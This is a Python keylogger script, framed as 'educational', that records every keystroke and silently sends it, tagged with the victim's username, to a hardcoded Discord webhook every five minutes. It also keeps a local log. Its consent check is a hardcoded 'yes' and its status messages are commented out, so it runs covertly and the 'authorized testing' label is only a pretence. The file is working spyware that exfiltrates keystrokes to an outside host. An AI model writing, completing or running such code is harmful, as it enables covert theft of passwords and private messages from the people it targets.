import pynput
from pynput import keyboard
import threading
import requests
import time
from datetime import datetime
import os
import sys
import getpass


UserName = getpass.getuser()

class EducationalKeylogger:
    def __init__(self, webhook_url):
        """
        Educational keylogger for authorized testing only
        """
        self.webhook_url = webhook_url
        self.key_log = []
        self.log_file = "keystrokes.txt"
        self.interval = 300
        
    def on_press(self, key):
        """Callback function when a key is pressed"""
        try:
            # Log alphanumeric keys
            self.key_log.append(key.char)
        except AttributeError:
            # Log special keys
            special_keys = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: " [ENTER]\n",
                keyboard.Key.tab: " [TAB] ",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.delete: " [DELETE] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.ctrl: " [CTRL] ",
                keyboard.Key.alt: " [ALT] ",
                keyboard.Key.esc: " [ESC] ",
                keyboard.Key.up: " [UP] ",
                keyboard.Key.down: " [DOWN] ",
                keyboard.Key.left: " [LEFT] ",
                keyboard.Key.right: " [RIGHT] "
            }
            
            if key in special_keys:
                self.key_log.append(special_keys[key])
            else:
                self.key_log.append(f" [{str(key)}] ")
    
    def save_to_file(self):
        """Save keystrokes to local file"""
        with open(self.log_file, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n[{timestamp}] Session Log:\n")
            f.write(''.join(self.key_log))
            f.write("\n" + "="*50 + "\n")
    
    def send_to_discord(self):
        """Send keystrokes to Discord webhook"""
        if not self.key_log:
            return
            
        # Prepare the message
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        keystrokes = ''.join(self.key_log)
        
        # Split into chunks if too long (Discord limit: 2000 chars)
        chunks = [keystrokes[i:i+1900] for i in range(0, len(keystrokes), 1900)]
        
        for i, chunk in enumerate(chunks):
            data = {
                "content": f"**Keylogger Report  - **{UserName}** - {timestamp}**\n```\n{chunk}\n```"
            }
            
            try:
                requests.post(self.webhook_url, json=data)
                time.sleep(1)  # Rate limiting
            except Exception as e:
                pass
        # Save to file as backup
        self.save_to_file()
        
        # Clear the log
        self.key_log = []
    
    def periodic_report(self):
        """Send reports at regular intervals"""
        while True:
            time.sleep(self.interval)
            self.send_to_discord()
    
    def start(self):
        
        
        # Start the periodic reporting thread
        report_thread = threading.Thread(target=self.periodic_report)
        report_thread.daemon = True
        report_thread.start()
        
        # Start the keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def main():
    # Configuration - REPLACE WITH YOUR WEBHOOK URL
    DISCORD_WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1476682595378004189/xTGlFU7a3MnAm0cNwH-sJpQo3lwes7sLi-RSMw7VCSXpm5jmhTohwFSlIzSgmglkpjqn"
    
    # Check if running with permission (add your own checks)
    
    
    consent = 'yes'
    
    if consent == 'yes':
        keylogger = EducationalKeylogger(DISCORD_WEBHOOK_URL)
        
        try:
            keylogger.start()
        except KeyboardInterrupt:
            #print("\nStopping keylogger...")
            keylogger.send_to_discord()  # Send final report
            #print("Final report sent. Exiting.")
    else:
        #print("You must have permission to run this tool.")
        sys.exit(1)

if __name__ == "__main__":
    # Check if required modules are installed
    try:
        import pynput
        import requests
    except ImportError as e:
        #print(f"Missing required module: {e}")
        #print("Install with: pip install pynput requests")
        sys.exit(1)
    
    main()